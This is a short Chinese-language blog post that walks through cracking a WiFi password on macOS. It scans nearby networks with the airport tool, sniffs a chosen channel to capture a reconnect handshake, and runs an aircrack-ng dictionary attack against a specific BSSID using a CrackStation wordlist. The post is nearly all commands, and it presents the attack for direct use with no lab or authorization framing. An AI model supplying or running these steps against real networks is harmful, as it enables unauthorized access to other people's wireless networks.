---
title: macOS 下使用 aircrack-ng 破解 wifi 密码
id: 315002
date: 2017-06-20 18:19:54
tags: 
  - macos
  - wifi
---

## 查看周围 WiFi

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
```

## 查看本机的无线网卡设备

`ifconfig`


## 抓包

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en1 sniff 6
```

en1是无线网卡设备；6是要破解wifi的CHANNEL。

使用手机连接 wifi,再断开, 获得的包放在/tmp

## 使用字典破解密码

```
sudo aircrack-ng -w password.txt -b c8:3a:35:30:3e:c8 /tmp/*.cap
```

`/Users/zhang/Downloads/crackstation-human-only.txt`

-w：指定字典文件；－b：指定要破解的wifi BSSID


